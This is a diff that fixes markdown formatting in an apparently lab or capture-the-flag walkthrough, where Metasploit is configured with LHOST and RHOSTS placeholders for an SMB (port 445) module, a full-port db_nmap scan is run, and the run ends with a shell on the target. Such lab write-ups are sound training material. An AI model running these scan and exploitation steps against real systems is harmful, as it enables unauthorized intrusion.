@@ -159,9 +159,9 @@ Some of the required properties are alreadu filled with default values such aas
 The local port (LPORT) and remote port (RPORT) are also preconfigured. They
 will keep as well. The RPORT is preconfigured to port 445 – SMB port.
 
-The local IP address (LHOST , also known as <attacker-IP>), and remote IP
-address (RHOSTS, also known as <target-IP>) – those we will have to set to our
-own pwnbox <attacker-IP>, and the provided target machine IP (<target-IP>).
+The local IP address (LHOST , also known as `<attacker-IP>`), and remote IP
+address (RHOSTS, also known as `<target-IP>`) – those we will have to set to our
+own pwnbox `<attacker-IP>`, and the provided target machine IP (`<target-IP>`).
 So lets do just that:
 ```bash
 set LHOST <attacker-IP>
@@ -557,7 +557,7 @@ exploits to test on metasploit, but it is a nice feature)
 ```
 
 Anyway, lets run the scan:
-db_nmap -sV -p- -T5 -A <target-IP>
+db_nmap -sV -p- -T5 -A `<target-IP>`
 
 
 *
@@ -612,8 +612,8 @@ Lets set the attacker machine and target machine:
 ```bash
 set RHOSTS <target-IP>
 set LHOST <attacker-IP>
-```
 run
+```
 
 
 And we have a shell! Lets see what is our user
